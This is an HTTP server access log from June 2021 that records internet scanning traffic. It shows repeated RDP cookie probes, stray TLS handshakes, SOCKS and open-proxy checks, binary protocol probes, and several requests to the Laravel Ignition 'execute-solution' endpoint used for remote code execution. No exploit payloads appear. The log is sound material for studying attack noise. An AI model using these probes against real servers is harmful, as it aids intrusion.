45.155.205.209 - - [05/Jun/2021 15:15:45] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [05/Jun/2021 15:15:45] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
193.106.29.74 - - [05/Jun/2021 15:48:03] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
193.106.29.74 - - [05/Jun/2021 15:48:03] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [05/Jun/2021 16:36:55] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [05/Jun/2021 16:36:55] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [05/Jun/2021 19:23:20] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [05/Jun/2021 19:23:20] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
89.248.165.107 - - [05/Jun/2021 19:56:12] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
89.248.165.107 - - [05/Jun/2021 19:56:12] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
89.248.165.107 - - [05/Jun/2021 20:01:30] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
89.248.165.107 - - [05/Jun/2021 20:01:30] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
89.248.165.107 - - [05/Jun/2021 20:05:48] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
89.248.165.107 - - [05/Jun/2021 20:05:48] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
89.248.165.107 - - [05/Jun/2021 20:10:30] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
89.248.165.107 - - [05/Jun/2021 20:10:30] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
185.202.2.149 - - [05/Jun/2021 20:41:33] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
185.202.2.149 - - [05/Jun/2021 20:41:33] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
199.195.252.133 - - [05/Jun/2021 21:45:22] "[33mGET / HTTP/1.1[0m" 404 -
185.220.205.106 - - [06/Jun/2021 00:13:38] code 400, message Bad HTTP/0.9 request type ("\x16\x03\x01\x00u\x01\x00\x00q\x03\x03ÃÃ°Z-Â°ÃµÃ¶L=Ã»Â¼Ã¶Ãª\x14>Â§\x19^^\x12Â£4\x93Ã¥\x87.'\x8f+g`Ã«\x00\x00\x1aÃ/Ã+Ã\x11Ã\x07Ã\x13Ã")
185.220.205.106 - - [06/Jun/2021 00:13:38] "[35m[1m u  qÃÃ°Z-Â°ÃµÃ¶L=Ã»Â¼Ã¶Ãª>Â§^^Â£4ÂÃ¥Â.'Â+g`Ã«  Ã/Ã+ÃÃÃÃ	ÃÃ[0m" HTTPStatus.BAD_REQUEST -
185.173.35.61 - - [06/Jun/2021 01:30:48] "[33mGET / HTTP/1.1[0m" 404 -
162.142.125.39 - - [06/Jun/2021 02:28:32] "[33mGET / HTTP/1.1[0m" 404 -
185.180.143.14 - - [06/Jun/2021 02:42:40] "[33mGET / HTTP/1.1[0m" 404 -
162.142.125.38 - - [06/Jun/2021 03:02:44] "[33mGET / HTTP/1.1[0m" 404 -
162.142.125.38 - - [06/Jun/2021 03:02:45] "[33mGET / HTTP/1.1[0m" 404 -
45.155.205.209 - - [06/Jun/2021 05:33:42] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [06/Jun/2021 05:33:42] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [06/Jun/2021 07:49:15] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [06/Jun/2021 07:49:15] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
74.82.47.5 - - [06/Jun/2021 08:11:18] "[33mGET / HTTP/1.1[0m" 404 -
45.155.205.209 - - [06/Jun/2021 10:15:34] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [06/Jun/2021 10:15:34] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
193.106.29.74 - - [06/Jun/2021 10:54:33] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
193.106.29.74 - - [06/Jun/2021 10:54:33] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
47.241.193.60 - - [06/Jun/2021 11:09:49] "[33mGET http://passport.baidu.com/ HTTP/1.1[0m" 404 -
47.241.193.60 - - [06/Jun/2021 11:10:39] code 400, message Bad request syntax ('\x04\x01\x00Pg)Â§Ãª\x00')
47.241.193.60 - - [06/Jun/2021 11:10:39] "[35m[1m Pg)Â§Ãª [0m" HTTPStatus.BAD_REQUEST -
47.241.193.60 - - [06/Jun/2021 11:10:58] code 400, message Bad request syntax ('\x05\x01\x00')
47.241.193.60 - - [06/Jun/2021 11:10:58] "[35m[1m [0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [06/Jun/2021 11:44:15] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [06/Jun/2021 11:44:15] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
89.248.165.107 - - [06/Jun/2021 16:08:11] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
89.248.165.107 - - [06/Jun/2021 16:08:11] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
89.248.165.107 - - [06/Jun/2021 16:31:01] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
89.248.165.107 - - [06/Jun/2021 16:31:01] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
89.248.165.107 - - [06/Jun/2021 16:52:32] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
89.248.165.107 - - [06/Jun/2021 16:52:32] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
89.248.165.107 - - [06/Jun/2021 17:13:55] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
89.248.165.107 - - [06/Jun/2021 17:13:55] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
124.156.55.36 - - [06/Jun/2021 19:46:54] "[33mGET / HTTP/1.0[0m" 404 -
124.156.55.36 - - [06/Jun/2021 19:46:54] "[33mGET / HTTP/1.0[0m" 404 -
124.156.55.36 - - [06/Jun/2021 19:57:37] code 400, message Bad request syntax ('\x01\x00\x00\x00 Â¿\x02\x00\x88\x13\x00\x00\x87\x00\x00\x00NIMABIJIAN\x04\x03\x00\x00{\x99Caig\x9c\x03ÃeBÃ\tÃ\x18a\x11\x1a\x91\x1f\x02\tcof\x91Ã\x80sJ5Ã\x80Ã¦\x9a~Â¹Ã\x83^\x96Ã®N\x16\x96\x96&Ã¦\x03ÃªÂ¼\x81\x02=Â¬\x10Ãº?7\x03ÃÃÃ·Ã¤\x98`pÃ¦\x8dÃÂ©\x8dÃ\x06ÃÂ¯\x91Ã§\x82sÃ·\x14HÃÃ¡W\x9a\x93C\x9e]Â¤\x01#\x03#\x03]\x03c]CC\x05C\x03+S\x03bÃ´\x00\x00/\x9e\x16E')
124.156.55.36 - - [06/Jun/2021 19:57:37] "[35m[1m    Â¿ Â  Â   NIMABIJIAN  {ÂCaigÂÃeBÃ	ÃaÂ	cofÂÃÂsJ5ÃÂÃ¦Â~Â¹ÃÂ^ÂÃ®NÂÂ&Ã¦ÃªÂ¼Â=Â¬Ãº?7ÃÃÃ·Ã¤Â`pÃ¦ÂÃÂ©ÂÃÃÂ¯ÂÃ§ÂsÃ·HÃÃ¡WÂÂCÂ]Â¤##]c]CCC+SbÃ´  /ÂE[0m" HTTPStatus.BAD_REQUEST -
124.156.55.36 - - [06/Jun/2021 19:57:37] code 400, message Bad request syntax ('\x16\x03\x01\x00Ã®\x01\x00\x00Ãª\x03\x03\x85$RhLÂ»f\x07\x95\x8d\x90Â¾\x9e\x82Â¶<Y\x1c=\x84ZdÃiÂ¯roy1Â¥Ul Ã¢Â§\x0fÂ¿Â©\tÃ±\x92"\x97Â²H,\x90\x14vÃ0UÃ¿\x11L:(<Ã¹PÃH\x7f*Ã¬\x00&Ã/Ã0Ã+Ã,ÃÂ¨ÃÂ©Ã\x13Ã\tÃ\x14Ã')
124.156.55.36 - - [06/Jun/2021 19:57:37] "[35m[1m Ã®  ÃªÂ$RhLÂ»fÂÂÂÂ¾ÂÂÂ¶<Y=ÂZdÃiÂ¯roy1Â¥Ul Ã¢Â§Â¿Â©	Ã±Â"ÂÂ²H,ÂvÃ0UÃ¿L:(<Ã¹PÃH*Ã¬ &Ã/Ã0Ã+Ã,ÃÂ¨ÃÂ©ÃÃ	ÃÃ[0m" HTTPStatus.BAD_REQUEST -
124.156.55.36 - - [06/Jun/2021 19:57:38] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00Ã®\x01\x00\x00Ãª\x03\x03\x9foÂ°Ã±-Ã\x011=')
124.156.55.36 - - [06/Jun/2021 19:57:38] "[35m[1m Ã®  ÃªÂoÂ°Ã±-Ã1=ÃÂM[0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [06/Jun/2021 21:36:07] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [06/Jun/2021 21:36:07] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
106.12.126.124 - - [06/Jun/2021 23:39:19] "[33mPOST /_ignition/execute-solution HTTP/1.1[0m" 404 -
161.189.192.94 - - [07/Jun/2021 01:22:20] code 400, message Bad request syntax ('{\x01\x00\x1615888888888ÃÂ¨\x90Ã\x13\x8a{')
161.189.192.94 - - [07/Jun/2021 01:22:20] "[35m[1m{ 15888888888ÃÂ¨ÂÃÂ{[0m" HTTPStatus.BAD_REQUEST -
161.189.134.11 - - [07/Jun/2021 01:24:51] code 400, message Bad HTTP/0.9 request type ('xx')
161.189.134.11 - - [07/Jun/2021 01:24:51] "[35m[1mxxSA52b -[0m" HTTPStatus.BAD_REQUEST -
161.189.192.94 - - [07/Jun/2021 01:27:53] code 400, message Bad request syntax ('&&&&~\x04Â»8ÃaÃ½T\x07P.VJÃ\x04;\x13\x0600-0C-29-B1-35-79')
161.189.192.94 - - [07/Jun/2021 01:27:53] "[35m[1m&&&&~Â»8ÃaÃ½TP.VJÃ;00-0C-29-B1-35-79[0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [07/Jun/2021 01:31:18] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [07/Jun/2021 01:31:18] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
161.189.134.11 - - [07/Jun/2021 01:37:36] code 400, message Bad request syntax ('\x00\x00\x00TZ\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x10\x04\x01.\x05\x00\x00\x00\x00\x81IÂ¨Ã\x00\x0c)\x83zÂ»\x01\x00zÃf\x00\x8d\x16Ã~\x9dU\x05Ã±\x1fiÂ»Â©\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00ÃÃÂ¢|Â¦vÂ½Ã³\x1eOÃÃÃÂ®Ãd')
161.189.134.11 - - [07/Jun/2021 01:37:36] "[35m[1m   TZ         .    ÂIÂ¨Ã )ÂzÂ» zÃf ÂÃ~ÂUÃ±iÂ»Â©                ÃÃÂ¢|Â¦vÂ½Ã³OÃÃÃÂ®Ãd[0m" HTTPStatus.BAD_REQUEST -
161.189.134.11 - - [07/Jun/2021 01:44:18] code 400, message Bad request syntax ('~\x00\x02\x00\x00\x01\x88\x88\x88\x88\x88\x03Â¥-~')
161.189.134.11 - - [07/Jun/2021 01:44:18] "[35m[1m~   ÂÂÂÂÂÂ¥-~[0m" HTTPStatus.BAD_REQUEST -
161.189.134.11 - - [07/Jun/2021 01:45:49] code 400, message Bad request syntax ('[\x00\x00\x00H\x00\x00\x00\x01\x10\x01\x00\x01\x04j\x00\x00\x01\x00\x00\x00\x00')
161.189.134.11 - - [07/Jun/2021 01:45:49] "[35m[1m[   H    j      [0m" HTTPStatus.BAD_REQUEST -
161.189.134.11 - - [07/Jun/2021 01:50:58] code 400, message Bad HTTP/0.9 request type ('\x02Â¤UÃ¿\x00\x00\x00')
161.189.134.11 - - [07/Jun/2021 01:50:58] "[35m[1mÂ¤UÃ¿   [0m" HTTPStatus.BAD_REQUEST -
161.189.134.11 - - [07/Jun/2021 01:52:26] code 400, message Bad request syntax ('~~\x01\x00\x124Vx\x124/\x00\x08\x02\x00\x03Y\x10\x11\x15Q\x11\x03kÃ')
161.189.134.11 - - [07/Jun/2021 01:52:26] "[35m[1m~~ 4Vx4/  YQkÃ[0m" HTTPStatus.BAD_REQUEST -
161.189.192.94 - - [07/Jun/2021 01:57:14] code 400, message Bad request syntax ('333766643833656338616434363333643963363962386536653538383937393235613033653338636434')
161.189.192.94 - - [07/Jun/2021 01:57:14] "[35m[1m333766643833656338616434363333643963363962386536653538383937393235613033653338636434[0m" HTTPStatus.BAD_REQUEST -
183.136.225.14 - - [07/Jun/2021 02:00:11] "[33mGET / HTTP/1.1[0m" 404 -
183.136.225.14 - - [07/Jun/2021 02:00:11] "[33mGET / HTTP/1.1[0m" 404 -
183.136.225.14 - - [07/Jun/2021 02:00:11] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
125.64.94.140 - - [07/Jun/2021 02:45:09] code 400, message Bad request syntax ('\x01\x00\x00\x00 Â¿\x02\x00\x88\x13\x00\x00\x87\x00\x00\x00NIMABIJIAN\x04\x03\x00\x00{\x99Caig\x9c\x03ÃeBÃ\tÃ\x18a\x11\x1a\x91\x1f\x02\tcof\x91Ã\x80sJ5Ã\x80Ã¦\x9a~Â¹Ã\x83^\x96Ã®N\x16\x96\x96&Ã¦\x03ÃªÂ¼\x81\x02=Â¬\x10Ãº?7\x03ÃÃÃ·Ã¤\x98`pÃ¦\x8dÃÂ©\x8dÃ\x06ÃÂ¯\x91Ã§\x82sÃ·\x14HÃÃ¡W\x9a\x93C\x9e]Â¤\x01#\x03#\x03]\x03c]CC\x05C\x03+S\x03bÃ´\x00\x00/\x9e\x16E')
125.64.94.140 - - [07/Jun/2021 02:45:09] "[35m[1m    Â¿ Â  Â   NIMABIJIAN  {ÂCaigÂÃeBÃ	ÃaÂ	cofÂÃÂsJ5ÃÂÃ¦Â~Â¹ÃÂ^ÂÃ®NÂÂ&Ã¦ÃªÂ¼Â=Â¬Ãº?7ÃÃÃ·Ã¤Â`pÃ¦ÂÃÂ©ÂÃÃÂ¯ÂÃ§ÂsÃ·HÃÃ¡WÂÂCÂ]Â¤##]c]CCC+SbÃ´  /ÂE[0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [07/Jun/2021 03:36:07] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [07/Jun/2021 03:36:07] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
167.248.133.37 - - [07/Jun/2021 10:44:36] "[33mGET / HTTP/1.1[0m" 404 -
167.248.133.37 - - [07/Jun/2021 10:44:36] "[33mGET / HTTP/1.1[0m" 404 -
45.155.205.209 - - [07/Jun/2021 12:49:44] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [07/Jun/2021 12:49:44] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
103.211.21.203 - - [07/Jun/2021 13:43:07] "[33mPOST /_ignition/execute-solution HTTP/1.1[0m" 404 -
203.159.80.75 - - [07/Jun/2021 14:26:54] code 400, message Bad HTTP/0.9 request type ('ZÂ¥\x01')
203.159.80.75 - - [07/Jun/2021 14:26:54] "[35m[1mZÂ¥     [0m" HTTPStatus.BAD_REQUEST -
202.181.207.89 - - [07/Jun/2021 15:37:39] "[33mPOST /_ignition/execute-solution HTTP/1.1[0m" 404 -
203.159.80.75 - - [07/Jun/2021 17:51:53] code 400, message Bad HTTP/0.9 request type ('ZÂ¥\x01')
203.159.80.75 - - [07/Jun/2021 17:51:53] "[35m[1mZÂ¥     [0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [07/Jun/2021 18:56:40] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [07/Jun/2021 18:56:40] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
118.126.124.172 - - [07/Jun/2021 20:03:51] "[33mGET / HTTP/1.1[0m" 404 -
185.202.2.149 - - [07/Jun/2021 21:05:06] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
185.202.2.149 - - [07/Jun/2021 21:05:06] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
193.106.29.74 - - [07/Jun/2021 21:40:46] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
193.106.29.74 - - [07/Jun/2021 21:40:46] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
106.75.212.55 - - [07/Jun/2021 23:25:45] "[33mGET http://www.qq.com/404/search_children.js HTTP/1.1[0m" 404 -
106.75.212.55 - - [07/Jun/2021 23:25:55] code 400, message Bad request syntax ('\x05\x01\x00')
106.75.212.55 - - [07/Jun/2021 23:25:55] "[35m[1m [0m" HTTPStatus.BAD_REQUEST -
106.75.212.55 - - [07/Jun/2021 23:25:55] code 400, message Bad request syntax ('\x04\x01\x00PpTi4\x00')
106.75.212.55 - - [07/Jun/2021 23:25:55] "[35m[1m PpTi4 [0m" HTTPStatus.BAD_REQUEST -
111.7.96.175 - - [07/Jun/2021 23:39:23] code 400, message Bad request version ('\x00/\x00')
111.7.96.175 - - [07/Jun/2021 23:39:23] "[35m[1m  i  eUÂ§Ã¤random1random2random3random4   / [0m" HTTPStatus.BAD_REQUEST -
111.7.96.175 - - [07/Jun/2021 23:39:23] code 400, message Bad request syntax ('\x16\x03\x00\x00S\x01\x00\x00O\x03\x00?GÃÃ·Âº,Ã®ÃªÂ²`~Ã³\x00Ã½\x82{Â¹Ã\x96Ãw\x9bÃ¦ÃÃ<=ÃoÃ¯\x10n\x00\x00(\x00\x16\x00\x13\x00')
111.7.96.175 - - [07/Jun/2021 23:39:23] "[35m[1m  S  O ?GÃÃ·Âº,Ã®ÃªÂ²`~Ã³ Ã½Â{Â¹ÃÂÃwÂÃ¦ÃÃ<=ÃoÃ¯n  (   [0m" HTTPStatus.BAD_REQUEST -
111.7.96.175 - - [07/Jun/2021 23:39:24] code 400, message Bad request syntax ('\x00\x06\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07version\x04bind\x00\x00\x10\x00\x03')
111.7.96.175 - - [07/Jun/2021 23:39:24] "[35m[1m         versionbind   [0m" HTTPStatus.BAD_REQUEST -
111.7.96.175 - - [07/Jun/2021 23:39:26] code 400, message Bad request version ('\x00\x01\x97|\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
111.7.96.175 - - [07/Jun/2021 23:39:26] "[35m[1mrÃ¾        ÂÂ  Â|                    [0m" HTTPStatus.BAD_REQUEST -
111.7.96.175 - - [07/Jun/2021 23:39:26] "[33mGET / HTTP/1.0[0m" 404 -
111.7.96.175 - - [07/Jun/2021 23:39:26] "[33mHEAD / HTTP/1.1[0m" 404 -
111.7.96.175 - - [07/Jun/2021 23:39:26] "[33mGET / HTTP/1.1[0m" 404 -
111.7.96.175 - - [07/Jun/2021 23:39:26] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
45.155.205.209 - - [08/Jun/2021 00:18:12] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [08/Jun/2021 00:18:12] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
162.142.125.56 - - [08/Jun/2021 01:06:06] "[33mGET / HTTP/1.1[0m" 404 -
162.142.125.56 - - [08/Jun/2021 01:06:06] "[33mGET / HTTP/1.1[0m" 404 -
184.105.139.68 - - [08/Jun/2021 01:25:34] "[33mGET / HTTP/1.1[0m" 404 -
89.248.165.19 - - [08/Jun/2021 02:14:16] code 400, message Bad request syntax ('\x03\x00\x00\x13\x0eÃ \x00\x00\x00\x00\x00\x01\x00\x08\x00\x02\x00\x00\x00')
89.248.165.19 - - [08/Jun/2021 02:14:16] "[35m[1m  Ã           [0m" HTTPStatus.BAD_REQUEST -
159.89.119.160 - - [08/Jun/2021 02:46:46] "[33mGET / HTTP/1.0[0m" 404 -
161.189.192.94 - - [08/Jun/2021 03:07:43] code 400, message Bad request syntax ('\x00\x00\x00TZ\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x10\x04\x01.\x05\x00\x00\x00\x00\x81IÂ¨Ã\x00\x0c)\x83zÂ»\x01\x00zÃf\x00\x8d\x16Ã~\x9dU\x05Ã±\x1fiÂ»Â©\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00ÃÃÂ¢|Â¦vÂ½Ã³\x1eOÃÃÃÂ®Ãd')
161.189.192.94 - - [08/Jun/2021 03:07:43] "[35m[1m   TZ         .    ÂIÂ¨Ã )ÂzÂ» zÃf ÂÃ~ÂUÃ±iÂ»Â©                ÃÃÂ¢|Â¦vÂ½Ã³OÃÃÃÂ®Ãd[0m" HTTPStatus.BAD_REQUEST -
101.251.200.219 - - [08/Jun/2021 03:27:01] code 400, message Bad request version ('+[Ã§\x11\x00\x00\x88Ã0Ã,Ã(Ã$Ã\x14Ã')
101.251.200.219 - - [08/Jun/2021 03:27:01] "[35m[1m" Â«gbF^{8aÃ£ÃÃ_}Â¯ÃvÃ¦Ã~fÂÂªÂÂ¸Ã +[Ã§  ÂÃ0Ã,Ã(Ã$ÃÃ[0m" HTTPStatus.BAD_REQUEST -
101.251.200.219 - - [08/Jun/2021 03:27:01] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x01"\x01\x00\x01')
101.251.200.219 - - [08/Jun/2021 03:27:01] "[35m[1m" ÂgÃÃ`Ã«yÂÃ½ZDÃ¸/ÂM&zÃÃ´ÂÃÂÂ§ÂÂ³Ã£7NNÃ   ÂÃ0Ã,Ã(Ã$ÃÃ[0m" HTTPStatus.BAD_REQUEST -
101.251.200.219 - - [08/Jun/2021 03:27:01] code 400, message Bad request syntax ('\x16\x03\x01\x00Ã\x01\x00\x00Ã\x03\x02h\x03Ã³% [/NÂ«\\ÃÃ\rÃ\x88Â³|W\x11,Ã¬ÃÂ»Ã­cÃ¢\x85L1N\xadÃ\x00\x00PÃ\x14Ã')
101.251.200.219 - - [08/Jun/2021 03:27:01] "[35m[1m Ã  ÃhÃ³% [/NÂ«\ÃÃÃÂÂ³|W,Ã¬ÃÂ»Ã­cÃ¢ÂL1NÂ­Ã  PÃÃ[0m" HTTPStatus.BAD_REQUEST -
101.251.200.219 - - [08/Jun/2021 03:27:01] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00Ã\x01\x00\x00Ã\x03\x0159Â£\\\xad9Ã¤Â¯Ã\x04Ã³D\x92\x99Ã \x94[\x11\x02Â«ÃÃ')
101.251.200.219 - - [08/Jun/2021 03:27:01] "[35m[1m Ã  Ã59Â£\Â­9Ã¤Â¯ÃÃ³DÂÂÃ Â[Â«ÃÃÂ¶-Ã¦Â¼ÃÂ¡1Â£  PÃÃ[0m" HTTPStatus.BAD_REQUEST -
101.251.200.219 - - [08/Jun/2021 03:27:01] "[33mGET / HTTP/1.1[0m" 404 -
89.248.165.10 - - [08/Jun/2021 03:31:43] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
89.248.165.10 - - [08/Jun/2021 03:31:43] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
88.9.119.217 - - [08/Jun/2021 03:59:32] "[33mGET / HTTP/1.1[0m" 404 -
45.155.205.209 - - [08/Jun/2021 04:07:31] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [08/Jun/2021 04:07:31] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
89.248.165.10 - - [08/Jun/2021 04:39:07] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
89.248.165.10 - - [08/Jun/2021 04:39:07] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
89.248.165.10 - - [08/Jun/2021 05:21:11] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
89.248.165.10 - - [08/Jun/2021 05:21:11] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
89.248.165.10 - - [08/Jun/2021 06:01:00] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
89.248.165.10 - - [08/Jun/2021 06:01:00] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [08/Jun/2021 06:39:17] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [08/Jun/2021 06:39:17] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
112.13.203.22 - - [08/Jun/2021 07:41:48] code 400, message Bad request syntax ('\x03\x00\x00\x13\x0eÃ \x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00')
112.13.203.22 - - [08/Jun/2021 07:41:48] "[35m[1m  Ã           [0m" HTTPStatus.BAD_REQUEST -
47.107.181.245 - - [08/Jun/2021 08:19:20] "[33mPOST /_ignition/execute-solution HTTP/1.1[0m" 404 -
45.155.205.209 - - [08/Jun/2021 08:36:47] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [08/Jun/2021 08:36:47] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
203.159.80.75 - - [08/Jun/2021 10:56:48] code 400, message Bad HTTP/0.9 request type ('ZÂ¥\x01')
203.159.80.75 - - [08/Jun/2021 10:56:48] "[35m[1mZÂ¥     [0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [08/Jun/2021 11:23:52] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [08/Jun/2021 11:23:52] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
193.106.29.74 - - [08/Jun/2021 11:26:52] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
193.106.29.74 - - [08/Jun/2021 11:26:52] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
47.241.193.60 - - [08/Jun/2021 12:43:33] "[33mGET http://passport.baidu.com/ HTTP/1.1[0m" 404 -
47.241.193.60 - - [08/Jun/2021 12:43:57] code 400, message Bad request syntax ('\x04\x01\x00Pg)Â§Ãª\x00')
47.241.193.60 - - [08/Jun/2021 12:43:57] "[35m[1m Pg)Â§Ãª [0m" HTTPStatus.BAD_REQUEST -
47.241.193.60 - - [08/Jun/2021 12:44:28] code 400, message Bad request syntax ('\x05\x01\x00')
